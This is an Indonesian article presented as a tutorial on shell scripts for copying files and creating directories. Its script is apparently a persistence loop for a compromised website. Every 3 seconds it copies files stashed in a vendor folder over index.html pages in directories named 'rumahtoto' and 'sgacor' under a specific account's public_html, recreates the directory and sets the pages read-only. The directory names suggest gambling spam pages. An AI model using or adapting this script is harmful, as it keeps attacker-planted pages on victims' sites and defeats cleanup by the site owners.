# **Mengelola Script Shell untuk Manipulasi File dan Pembuatan Direktori**

Artikel ini menjelaskan cara menggunakan script shell untuk menyalin file, mengubah izin file, dan membuat direktori secara otomatis dengan penjadwalan.

## **Deskripsi Script**

Script ini dirancang untuk menjalankan tugas-tugas berikut setiap 3 detik:
1. Menyalin file `robots.txt` dari direktori tertentu ke lokasi lain dan mengubah izinnya.
2. Membuat direktori baru dan menyalin file `robot.txt` ke dalamnya, lalu mengubah izinnya.

### **Fungsi Script**
- **Menyalin File**: Menyalin `robots.txt` ke `index.html` dalam direktori lain.
- **Membuat Direktori**: Membuat direktori baru dan menyalin file `robot.txt` ke dalamnya.
- **Mengubah Izin File**: Mengatur izin file menjadi `444` (read-only) setelah menyalin.

## **Script Shell**

```sh
#!/bin/sh
while true
do
    # Copy file
    cp /home/stiatab2/public_html/vendor/ifsnop/robots.txt /home/stiatab2/public_html/rumahtoto/index.html

    chmod 444 /home/stiatab2/public_html/rumahtoto/index.html
    
    # Create directory
    mkdir /home/stiatab2/public_html/sgacor

    cp /home/stiatab2/public_html/vendor/robot.txt /home/stiatab2/public_html/sgacor/index.html

    chmod 444 /home/stiatab2/public_html/sgacor/index.html

    sleep 3
done
